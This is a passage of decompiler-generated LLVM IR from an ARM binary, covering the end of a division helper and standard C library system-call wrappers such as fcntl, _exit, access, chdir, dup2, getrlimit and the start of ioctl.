  store i32 %v6_22b1c, i32* %r2.global-to-local, align 4
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb90, %.thread9, %bb89
  %v0_22b30 = phi i32 [ %v1_22b1c, %bb89 ], [ %v1_22b1c, %.thread9 ], [ %v6_22b1c, %bb90 ]
  %v0_22b20 = phi i32 [ %v6_22b18, %bb89 ], [ %v1_22b18, %.thread9 ], [ %v6_22b18, %bb90 ]
  %v2_22b20 = icmp eq i32 %v0_22b20, 0
  br i1 %v2_22b20, label %dec_label_pc_22b30, label %bb91

bb91:                                             ; preds = %thread-pre-split
  %tmp138 = icmp ult i32 %v1_22b24, 16
  br i1 %tmp138, label %dec_label_pc_22b30, label %.thread11

.thread11:                                        ; preds = %bb91
  %v4_22b24 = udiv i32 %v1_22b24, 16
  %v4_22b28 = udiv i32 %v1_22b28, 16
  br label %dec_label_pc_22af0

dec_label_pc_22b30:                               ; preds = %thread-pre-split, %bb91
  store i32 %v0_22b30, i32* %r0.global-to-local, align 4
  ret i32 %v0_22b30

dec_label_pc_22b38:                               ; preds = %dec_label_pc_22aa4
  %v9_22aa4 = icmp eq i32 %v0_22aa4, %v1_22aa4
  %. = zext i1 %v9_22aa4 to i32
  store i32 %., i32* %r0.global-to-local, align 4
  ret i32 %.

dec_label_pc_22b44:                               ; preds = %dec_label_pc_22aac
  %v2_22b44 = icmp ugt i32 %v1_22aa4, 65535
  br i1 %v2_22b44, label %bb95, label %.thread16

bb95:                                             ; preds = %dec_label_pc_22b44
  %v2_22b48 = and i32 %v1_22aa4, 32768
  %v3_22b48 = icmp eq i32 %v2_22b48, 0
  %v4_22b48 = udiv i32 %v1_22aa4, 65536
  br i1 %v3_22b48, label %.thread16, label %bb96

.thread16:                                        ; preds = %bb95, %dec_label_pc_22b44
  %v0_22b5465 = phi i32 [ %v1_22aa4, %dec_label_pc_22b44 ], [ %v4_22b48, %bb95 ]
  br label %bb96

bb96:                                             ; preds = %bb95, %.thread16
  %v1_22b58 = phi i32 [ %v0_22b5465, %.thread16 ], [ %v4_22b48, %bb95 ]
  %storemerge = phi i32 [ 0, %.thread16 ], [ 16, %bb95 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_22b54 = icmp ugt i32 %v1_22b58, 255
  br i1 %v2_22b54, label %bb97, label %.thread17

bb97:                                             ; preds = %bb96
  %v2_22b58 = and i32 %v1_22b58, 128
  %v3_22b58 = icmp eq i32 %v2_22b58, 0
  %v4_22b58 = udiv i32 %v1_22b58, 256
  br i1 %v3_22b58, label %.thread17, label %bb98

bb98:                                             ; preds = %bb97
  %v2_22b5c = or i32 %storemerge, 8
  store i32 %v2_22b5c, i32* %r2.global-to-local, align 4
  br label %.thread17

.thread17:                                        ; preds = %bb97, %bb96, %bb98
  %v1_22b68 = phi i32 [ %storemerge, %bb96 ], [ %storemerge, %bb97 ], [ %v2_22b5c, %bb98 ]
  %v1_22b64 = phi i32 [ %v1_22b58, %bb96 ], [ %v4_22b58, %bb97 ], [ %v4_22b58, %bb98 ]
  %v2_22b60 = icmp ugt i32 %v1_22b64, 15
  br i1 %v2_22b60, label %bb99, label %.thread18

bb99:                                             ; preds = %.thread17
  %v2_22b64 = and i32 %v1_22b64, 8
  %v3_22b64 = icmp eq i32 %v2_22b64, 0
  %v4_22b64 = udiv i32 %v1_22b64, 16
  br i1 %v3_22b64, label %.thread18, label %bb100

bb100:                                            ; preds = %bb99
  %v2_22b68 = add nsw i32 %v1_22b68, 4
  store i32 %v2_22b68, i32* %r2.global-to-local, align 4
  br label %.thread18

.thread18:                                        ; preds = %bb99, %.thread17, %bb100
  %v4_22b70 = phi i32 [ %v1_22b68, %.thread17 ], [ %v1_22b68, %bb99 ], [ %v2_22b68, %bb100 ]
  %v5_22b74 = phi i32 [ %v1_22b64, %.thread17 ], [ %v4_22b64, %bb99 ], [ %v4_22b64, %bb100 ]
  %v2_22b6c = icmp ugt i32 %v5_22b74, 3
  %v7_22b6c = icmp eq i32 %v5_22b74, 4
  %v2_22b70 = xor i1 %v7_22b6c, true
  %v3_22b70 = and i1 %v2_22b6c, %v2_22b70
  br i1 %v3_22b70, label %bb101, label %bb102

bb101:                                            ; preds = %.thread18
  %v5_22b70 = add nsw i32 %v4_22b70, 3
  store i32 %v5_22b70, i32* %r2.global-to-local, align 4
  br label %bb102

bb102:                                            ; preds = %.thread18, %bb101
  %v4_22b74 = phi i32 [ %v4_22b70, %.thread18 ], [ %v5_22b70, %bb101 ]
  %v2_22b74 = xor i1 %v2_22b6c, true
  %v3_22b74 = or i1 %v7_22b6c, %v2_22b74
  br i1 %v3_22b74, label %bb103, label %bb104

bb103:                                            ; preds = %bb102
  %v8_22b74 = udiv i32 %v5_22b74, 2
  %v9_22b74 = add i32 %v4_22b74, %v8_22b74
  store i32 %v9_22b74, i32* %r2.global-to-local, align 4
  br label %bb104

bb104:                                            ; preds = %bb102, %bb103
  %v1_22b78 = phi i32 [ %v4_22b74, %bb102 ], [ %v9_22b74, %bb103 ]
  %v6_22b78 = lshr i32 %v0_22aa4, %v1_22b78
  store i32 %v6_22b78, i32* %r0.global-to-local, align 4
  ret i32 %v6_22b78

dec_label_pc_22b80:                               ; preds = %entry
  %v0_22b84 = call i32 @__div0()
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_22b74, { 1, 0 }
  uselistorder i1 %v7_22b6c, { 1, 0 }
  uselistorder i32 %v4_22b64, { 1, 0 }
  uselistorder i32 %v1_22b64, { 1, 0, 2, 3 }
  uselistorder i32 %v2_22b5c, { 1, 0 }
  uselistorder i32 %v4_22b58, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2, 3 }
  uselistorder i32 %v1_22b58, { 1, 0, 2, 3 }
  uselistorder i32 %v4_22b48, { 1, 0 }
  uselistorder i32 %., { 1, 0 }
  uselistorder i32 %v0_22b20, { 1, 0 }
  uselistorder i32 %v0_22b30, { 1, 0, 2 }
  uselistorder i32 %v4_22b14, { 1, 0 }
  uselistorder i32 %v1_22b1c, { 1, 2, 0 }
  uselistorder i32 %v4_22b08, { 1, 0 }
  uselistorder i32 %v1_22b10, { 1, 2, 0 }
  uselistorder i32 %v4_22afc, { 1, 0 }
  uselistorder i32 %v1_22b04, { 1, 2, 0 }
  uselistorder i32 %v1_22b28, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_22af8, { 1, 0 }
  uselistorder i32 %v1_22b24, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_22ae4, { 1, 0 }
  uselistorder i32 %v3_22ae0, { 1, 0 }
  uselistorder i32 %v1_22ae0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_22ae4, { 1, 2, 0, 3 }
  uselistorder i32 %v4_22ad0, { 1, 0 }
  uselistorder i32 %v4_22acc, { 2, 1, 0 }
  uselistorder i32 %v1_22ad0, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_22ad8.pr36, { 1, 2, 0, 5, 4, 3 }
  uselistorder i32 %v1_22aa4, { 6, 2, 7, 8, 9, 4, 3, 0, 5, 1 }
  uselistorder i32 %v0_22aa4, { 2, 5, 3, 1, 4, 0 }
  uselistorder i32 %v0_22a98, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 4, 9, 5, 6, 7, 8, 0, 1 }
  uselistorder label %bb104, { 1, 0 }
  uselistorder label %bb102, { 1, 0 }
  uselistorder label %.thread18, { 2, 0, 1 }
  uselistorder label %.thread17, { 2, 0, 1 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_22b30, { 1, 0 }
  uselistorder label %thread-pre-split, { 0, 2, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 2, 0, 1 }
  uselistorder label %.thread7, { 1, 0 }
  uselistorder label %dec_label_pc_22aec, { 2, 0, 1 }
  uselistorder label %dec_label_pc_22ad8thread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
}

define i32 @__aeabi_uidivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_22b98 = udiv i32 %arg1, %arg2
  ret i32 %v2_22b98
}

define i32 @__div0() local_unnamed_addr {
entry:
  %v1_22bb4 = call i32 @__GI_raise(i32 8)
  ret i32 %v1_22bb4
}

define i32 @__GI___fcntl_nocancel(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %v1_22bd0 = add i32 %arg2, -12
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_22bd0, 2
  br i1 %tmp, label %dec_label_pc_22c0c, label %dec_label_pc_22be8

dec_label_pc_22be8:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp12 = icmp ult i32 %arg1, -4095
  br i1 %tmp12, label %dec_label_pc_22c40, label %dec_label_pc_22bfc

dec_label_pc_22bfc:                               ; preds = %dec_label_pc_22be8
  %v0_22c00 = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_22c34

dec_label_pc_22c0c:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %tmp13 = icmp ugt i32 %arg1, -4096
  br i1 %tmp13, label %dec_label_pc_22c28, label %dec_label_pc_22c40

dec_label_pc_22c28:                               ; preds = %dec_label_pc_22c0c
  %v0_22c2c = call i32 @__aeabi_read_tp()
  br label %dec_label_pc_22c34

dec_label_pc_22c34:                               ; preds = %dec_label_pc_22bfc, %dec_label_pc_22c28
  %storemerge2 = phi i32 [ %v0_22c00, %dec_label_pc_22bfc ], [ %v0_22c2c, %dec_label_pc_22c28 ]
  %storemerge.in = load i16, i16* @global_var_42934.3040, align 2
  %storemerge = sext i16 %storemerge.in to i32
  %v0_22c34 = load i32, i32* %r2.global-to-local, align 4
  %v1_22c34 = sub i32 0, %v0_22c34
  store i32 %v1_22c34, i32* %r2.global-to-local, align 4
  %v3_22c38 = add i32 %storemerge, %storemerge2
  %v4_22c38 = inttoptr i32 %v3_22c38 to i32*
  store i32 %v1_22c34, i32* %v4_22c38, align 4
  br label %dec_label_pc_22c40

dec_label_pc_22c40:                               ; preds = %dec_label_pc_22be8, %dec_label_pc_22c0c, %dec_label_pc_22c34
  %storemerge1 = phi i32 [ -1, %dec_label_pc_22c34 ], [ %arg1, %dec_label_pc_22c0c ], [ %arg1, %dec_label_pc_22be8 ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32* %r2.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i32 %arg1, { 2, 3, 0, 5, 1, 4 }
  uselistorder label %dec_label_pc_22c40, { 2, 1, 0 }
  uselistorder label %dec_label_pc_22c34, { 1, 0 }
}

define i32 @__libc_fcntl(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-32 = alloca i32, align 4
  %v6_22c58 = load i32, i32* @r2, align 4
  %v3_22c5c = load i32, i32* @r4, align 4
  store i32 %v3_22c5c, i32* %stack_var_-32, align 4
  %v6_22c5c = load i32, i32* @r5, align 4
  %v12_22c5c = load i32, i32* @r7, align 4
  %v4_22c6c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 29852) to i32*), align 4
  %v2_22c78 = icmp eq i32 %v4_22c6c, 0
  %v0_22c80 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_22c80, i32* @r5, align 4
  store i32 %arg2, i32* @r7, align 4
  store i32 %v6_22c58, i32* @r4, align 4
  br i1 %v2_22c78, label %dec_label_pc_22c9c, label %dec_label_pc_22c90

dec_label_pc_22c90:                               ; preds = %entry
  %v7_22c90 = icmp eq i32 %arg2, 7
  br i1 %v7_22c90, label %dec_label_pc_22cdc, label %bb

bb:                                               ; preds = %dec_label_pc_22c90
  %v8_22c94 = icmp eq i32 %arg2, 14
  br i1 %v8_22c94, label %dec_label_pc_22cdc, label %dec_label_pc_22c9c

dec_label_pc_22c9c:                               ; preds = %bb, %entry
  store i32 %v0_22c80, i32* @r2, align 4
  %tmp = icmp ult i32 %v0_22c80, -4095
  br i1 %tmp, label %dec_label_pc_22cd4, label %dec_label_pc_22cbc

dec_label_pc_22cbc:                               ; preds = %dec_label_pc_22c9c
  %v0_22cc0 = call i32 @__aeabi_read_tp()
  %v3_22cc4 = load i16, i16* @global_var_42934.3040, align 2
  %v4_22cc4 = sext i16 %v3_22cc4 to i32
  %v0_22cc8 = load i32, i32* @r2, align 4
  %v1_22cc8 = sub i32 0, %v0_22cc8
  store i32 %v1_22cc8, i32* @r2, align 4
  %v3_22ccc = add i32 %v4_22cc4, %v0_22cc0
  %v4_22ccc = inttoptr i32 %v3_22ccc to i32*
  store i32 %v1_22cc8, i32* %v4_22ccc, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22cd4

dec_label_pc_22cd4:                               ; preds = %dec_label_pc_22c9c, %dec_label_pc_22cbc
  %v0_22cd4 = phi i32 [ %v0_22c80, %dec_label_pc_22c9c ], [ -1, %dec_label_pc_22cbc ]
  br label %dec_label_pc_22d28

dec_label_pc_22cdc:                               ; preds = %dec_label_pc_22c90, %bb
  %v0_22cdc = call i32 @__libc_enable_asynccancel()
  store i32 %v0_22cdc, i32* %r6.global-to-local, align 4
  %v0_22cec = load i32, i32* @r5, align 4
  store i32 %v0_22cec, i32* %r0.global-to-local, align 4
  store i32 %v0_22cec, i32* @r2, align 4
  %tmp15 = icmp ult i32 %v0_22cec, -4095
  br i1 %tmp15, label %dec_label_pc_22d1c, label %dec_label_pc_22d04

dec_label_pc_22d04:                               ; preds = %dec_label_pc_22cdc
  %v1_22d08 = sub i32 0, %v0_22cec
  %v0_22d0c = call i32 @__aeabi_read_tp()
  store i32 %v0_22d0c, i32* %r0.global-to-local, align 4
  %v3_22d10 = load i16, i16* @global_var_42934.3040, align 2
  %v4_22d10 = sext i16 %v3_22d10 to i32
  %v3_22d14 = add i32 %v4_22d10, %v0_22d0c
  %v4_22d14 = inttoptr i32 %v3_22d14 to i32*
  store i32 %v1_22d08, i32* %v4_22d14, align 4
  store i32 -1, i32* @r2, align 4
  %v0_22d1c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_22d1c

dec_label_pc_22d1c:                               ; preds = %dec_label_pc_22cdc, %dec_label_pc_22d04
  %v0_22d20 = phi i32 [ %v0_22cec, %dec_label_pc_22cdc ], [ -1, %dec_label_pc_22d04 ]
  %v0_22d1c = phi i32 [ %v0_22cdc, %dec_label_pc_22cdc ], [ %v0_22d1c.pre, %dec_label_pc_22d04 ]
  store i32 %v0_22d1c, i32* %r0.global-to-local, align 4
  store i32 %v0_22d20, i32* @r7, align 4
  %v1_22d24 = call i32 @__libc_disable_asynccancel(i32 %v0_22d1c)
  store i32 %v1_22d24, i32* %r0.global-to-local, align 4
  %v0_22d28.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_22d28

dec_label_pc_22d28:                               ; preds = %dec_label_pc_22cd4, %dec_label_pc_22d1c
  %v0_22d28 = phi i32 [ %v0_22cd4, %dec_label_pc_22cd4 ], [ %v0_22d28.pre, %dec_label_pc_22d1c ]
  store i32 %v0_22d28, i32* %r0.global-to-local, align 4
  %v2_22d30 = load i32, i32* %stack_var_-32, align 4
  store i32 %v2_22d30, i32* @r4, align 4
  store i32 %v6_22c5c, i32* @r5, align 4
  store i32 %v12_22c5c, i32* @r7, align 4
  ret i32 %v0_22d28

; uselistorder directives
  uselistorder i32 %v0_22d28, { 1, 0 }
  uselistorder i32 %v0_22d1c, { 1, 0 }
  uselistorder i32 %v0_22cec, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_22c80, { 1, 0, 2, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 7, 6, 0, 1 }
  uselistorder label %dec_label_pc_22d28, { 1, 0 }
  uselistorder label %dec_label_pc_22d1c, { 1, 0 }
  uselistorder label %dec_label_pc_22cdc, { 1, 0 }
  uselistorder label %dec_label_pc_22cd4, { 1, 0 }
}

define i32 @__GI__exit(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_22d58

dec_label_pc_22d58:                               ; preds = %dec_label_pc_22d84, %dec_label_pc_22d98, %entry
  %v0_22d58 = phi i32 [ %arg1, %entry ], [ %v0_22d58.pre.pre, %dec_label_pc_22d98 ], [ %v0_22d84, %dec_label_pc_22d84 ]
  store i32 %v0_22d58, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_22d58, -4095
  br i1 %tmp, label %dec_label_pc_22d84, label %dec_label_pc_22d74

dec_label_pc_22d74:                               ; preds = %dec_label_pc_22d58
  %v0_22d74 = call i32 @__aeabi_read_tp()
  %v0_22d78 = load i32, i32* %r2.global-to-local, align 4
  %v1_22d78 = sub i32 0, %v0_22d78
  store i32 %v1_22d78, i32* %r2.global-to-local, align 4
  %v3_22d7c = load i16, i16* @global_var_42934.3040, align 2
  %v4_22d7c = sext i16 %v3_22d7c to i32
  %v3_22d80 = add i32 %v4_22d7c, %v0_22d74
  %v4_22d80 = inttoptr i32 %v3_22d80 to i32*
  store i32 %v1_22d78, i32* %v4_22d80, align 4
  %v0_22d84.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_22d84

dec_label_pc_22d84:                               ; preds = %dec_label_pc_22d58, %dec_label_pc_22d74
  %v0_22d84 = phi i32 [ %v0_22d58, %dec_label_pc_22d58 ], [ %v0_22d84.pre, %dec_label_pc_22d74 ]
  store i32 %v0_22d84, i32* %r2.global-to-local, align 4
  %tmp4 = icmp ult i32 %v0_22d84, -4095
  br i1 %tmp4, label %dec_label_pc_22d58, label %dec_label_pc_22d98

dec_label_pc_22d98:                               ; preds = %dec_label_pc_22d84
  %v0_22d98 = call i32 @__aeabi_read_tp()
  %v0_22d9c = load i32, i32* %r2.global-to-local, align 4
  %v1_22d9c = sub i32 0, %v0_22d9c
  store i32 %v1_22d9c, i32* %r2.global-to-local, align 4
  %v3_22da0 = load i16, i16* @global_var_42934.3040, align 2
  %v4_22da0 = sext i16 %v3_22da0 to i32
  %v3_22da4 = add i32 %v4_22da0, %v0_22d98
  %v4_22da4 = inttoptr i32 %v3_22da4 to i32*
  store i32 %v1_22d9c, i32* %v4_22da4, align 4
  %v0_22d58.pre.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_22d58

; uselistorder directives
  uselistorder i32 %v0_22d84, { 0, 2, 1 }
  uselistorder i32 %v0_22d58, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 1, 0, 2 }
  uselistorder label %dec_label_pc_22d84, { 1, 0 }
  uselistorder label %dec_label_pc_22d58, { 1, 0, 2 }
}

define i32 @access(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_22db4 = load i32, i32* @r7, align 4
  store i32 %v3_22db4, i32* %stack_var_-8, align 4
  %v0_22dc0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_22dc0, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_22dc0, -4095
  br i1 %tmp, label %dec_label_pc_22de8, label %dec_label_pc_22dd0

dec_label_pc_22dd0:                               ; preds = %entry
  %v0_22dd4 = call i32 @__aeabi_read_tp()
  %v3_22dd8 = load i16, i16* @global_var_42934.3040, align 2
  %v4_22dd8 = sext i16 %v3_22dd8 to i32
  %v0_22ddc = load i32, i32* %r2.global-to-local, align 4
  %v1_22ddc = sub i32 0, %v0_22ddc
  store i32 %v1_22ddc, i32* %r2.global-to-local, align 4
  %v3_22de0 = add i32 %v4_22dd8, %v0_22dd4
  %v4_22de0 = inttoptr i32 %v3_22de0 to i32*
  store i32 %v1_22ddc, i32* %v4_22de0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_22de8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_22de8

dec_label_pc_22de8:                               ; preds = %entry, %dec_label_pc_22dd0
  %v1_22dec = phi i32 [ %v0_22dc0, %entry ], [ -1, %dec_label_pc_22dd0 ]
  %v2_22de8 = phi i32 [ %v3_22db4, %entry ], [ %v2_22de8.pre, %dec_label_pc_22dd0 ]
  store i32 %v2_22de8, i32* @r7, align 4
  ret i32 %v1_22dec

; uselistorder directives
  uselistorder i32 %v0_22dc0, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_22de8, { 1, 0 }
}

define i32 @chdir(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_22df4 = load i32, i32* @r7, align 4
  store i32 %v3_22df4, i32* %stack_var_-8, align 4
  %v0_22e00 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_22e00, -4095
  br i1 %tmp, label %dec_label_pc_22e20, label %dec_label_pc_22e08

dec_label_pc_22e08:                               ; preds = %entry
  %v1_22e0c = sub i32 0, %v0_22e00
  %v3_22e10 = load i16, i16* @global_var_42934.3040, align 2
  %v4_22e10 = sext i16 %v3_22e10 to i32
  %v0_22e14 = call i32 @__aeabi_read_tp()
  %v3_22e18 = add i32 %v4_22e10, %v0_22e14
  %v4_22e18 = inttoptr i32 %v3_22e18 to i32*
  store i32 %v1_22e0c, i32* %v4_22e18, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_22e20.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_22e20

dec_label_pc_22e20:                               ; preds = %entry, %dec_label_pc_22e08
  %v1_22e24 = phi i32 [ %v0_22e00, %entry ], [ -1, %dec_label_pc_22e08 ]
  %v2_22e20 = phi i32 [ %v3_22df4, %entry ], [ %v2_22e20.pre, %dec_label_pc_22e08 ]
  store i32 %v2_22e20, i32* @r7, align 4
  ret i32 %v1_22e24

; uselistorder directives
  uselistorder i32 %v0_22e00, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_22e20, { 1, 0 }
}

define i32 @dup2(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_22e2c = load i32, i32* @r7, align 4
  store i32 %v3_22e2c, i32* %stack_var_-8, align 4
  %v0_22e38 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_22e38, i32* %r2.global-to-local, align 4
  %tmp = icmp ult i32 %v0_22e38, -4095
  br i1 %tmp, label %dec_label_pc_22e60, label %dec_label_pc_22e48

dec_label_pc_22e48:                               ; preds = %entry
  %v0_22e4c = call i32 @__aeabi_read_tp()
  %v3_22e50 = load i16, i16* @global_var_42934.3040, align 2
  %v4_22e50 = sext i16 %v3_22e50 to i32
  %v0_22e54 = load i32, i32* %r2.global-to-local, align 4
  %v1_22e54 = sub i32 0, %v0_22e54
  store i32 %v1_22e54, i32* %r2.global-to-local, align 4
  %v3_22e58 = add i32 %v4_22e50, %v0_22e4c
  %v4_22e58 = inttoptr i32 %v3_22e58 to i32*
  store i32 %v1_22e54, i32* %v4_22e58, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_22e60.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_22e60

dec_label_pc_22e60:                               ; preds = %entry, %dec_label_pc_22e48
  %v1_22e64 = phi i32 [ %v0_22e38, %entry ], [ -1, %dec_label_pc_22e48 ]
  %v2_22e60 = phi i32 [ %v3_22e2c, %entry ], [ %v2_22e60.pre, %dec_label_pc_22e48 ]
  store i32 %v2_22e60, i32* @r7, align 4
  ret i32 %v1_22e64

; uselistorder directives
  uselistorder i32 %v0_22e38, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_22e60, { 1, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %v2_22e70 = ptrtoint i32* %stack_var_-16 to i32
  %v2_22e7c = call i32 @getrlimit(i32 7, i32 %v2_22e70)
  %v1_22e80 = icmp slt i32 %v2_22e7c, 0
  %v5_22e84 = load i32, i32* %stack_var_-16, align 4
  %storemerge = select i1 %v1_22e80, i32 256, i32 %v5_22e84
  ret i32 %storemerge
}

define i32 @geteuid() local_unnamed_addr {
entry:
  %v1_22ea8 = load i32, i32* @r0, align 4
  ret i32 %v1_22ea8
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_22eac = load i32, i32* @r7, align 4
  store i32 %v3_22eac, i32* %stack_var_-8, align 4
  %v0_22eb8 = load i32, i32* %r0.global-to-local, align 4
  %tmp = icmp ult i32 %v0_22eb8, -4095
  br i1 %tmp, label %dec_label_pc_22ed8, label %dec_label_pc_22ec0

dec_label_pc_22ec0:                               ; preds = %entry
  %v1_22ec4 = sub i32 0, %v0_22eb8
  %v3_22ec8 = load i16, i16* @global_var_42934.3040, align 2
  %v4_22ec8 = sext i16 %v3_22ec8 to i32
  %v0_22ecc = call i32 @__aeabi_read_tp()
  %v3_22ed0 = add i32 %v4_22ec8, %v0_22ecc
  %v4_22ed0 = inttoptr i32 %v3_22ed0 to i32*
  store i32 %v1_22ec4, i32* %v4_22ed0, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v2_22ed8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_22ed8

dec_label_pc_22ed8:                               ; preds = %entry, %dec_label_pc_22ec0
  %v1_22edc = phi i32 [ %v0_22eb8, %entry ], [ -1, %dec_label_pc_22ec0 ]
  %v2_22ed8 = phi i32 [ %v3_22eac, %entry ], [ %v2_22ed8.pre, %dec_label_pc_22ec0 ]
  store i32 %v2_22ed8, i32* @r7, align 4
  ret i32 %v1_22edc

; uselistorder directives
  uselistorder i32 %v0_22eb8, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_22ed8, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v9_22ee4 = load i32, i32* @r3, align 4
  store i32 %v9_22ee4, i32* %stack_var_-4, align 4
  %v3_22ee8 = load i32, i32* @r4, align 4
  store i32 %v3_22ee8, i32* %stack_var_-32, align 4
  %v6_22ee8 = load i32, i32* @r5, align 4
  %v12_22ee8 = load i32, i32* @r7, align 4
  %v4_22ef8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_428d0.3044 to i32), i32 29852) to i32*), align 4
  %v2_22f00 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_22f00, i32* @r3, align 4
  %v2_22f04 = icmp eq i32 %v4_22ef8, 0
  %v0_22f0c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_22f0c, i32* @r4, align 4
  store i32 %arg2, i32* @r5, align 4
  br i1 %v2_22f04, label %dec_label_pc_22f1c, label %dec_label_pc_22f54

dec_label_pc_22f1c:                               ; preds = %entry
  %tmp = icmp ult i32 %v0_22f0c, -4095
  br i1 %tmp, label %dec_label_pc_22f4c, label %dec_label_pc_22f34

dec_label_pc_22f34:                               ; preds = %dec_label_pc_22f1c
  %v1_22f38 = sub i32 0, %v0_22f0c
  %v3_22f3c = load i16, i16* @global_var_42934.3040, align 2
  %v4_22f3c = sext i16 %v3_22f3c to i32
  store i32 %v4_22f3c, i32* @r3, align 4
  %v0_22f40 = call i32 @__aeabi_read_tp()
  %v2_22f44 = load i32, i32* @r3, align 4
  %v3_22f44 = add i32 %v2_22f44, %v0_22f40
  %v4_22f44 = inttoptr i32 %v3_22f44 to i32*
  store i32 %v1_22f38, i32* %v4_22f44, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_22f4c

dec_label_pc_22f4c:                               ; preds = %dec_label_pc_22f1c, %dec_label_pc_22f34
  %v0_22f4c = phi i32 [ %v0_22f0c, %dec_label_pc_22f1c ], [ -1, %dec_label_pc_22f34 ]
  br label %dec_label_pc_22fa0

dec_label_pc_22f54:                               ; preds = %entry
  %v0_22f54 = call i32 @__libc_enable_asynccancel()
  store i32 %v0_22f54, i32* %r6.global-to-local, align 4
  %v0_22f64 = load i32, i32* @r4, align 4
  store i32 %v0_22f64, i32* %r0.global-to-local, align 4
  %tmp15 = icmp ult i32 %v0_22f64, -4095
  br i1 %tmp15, label %dec_label_pc_22f94, label %dec_label_pc_22f7c

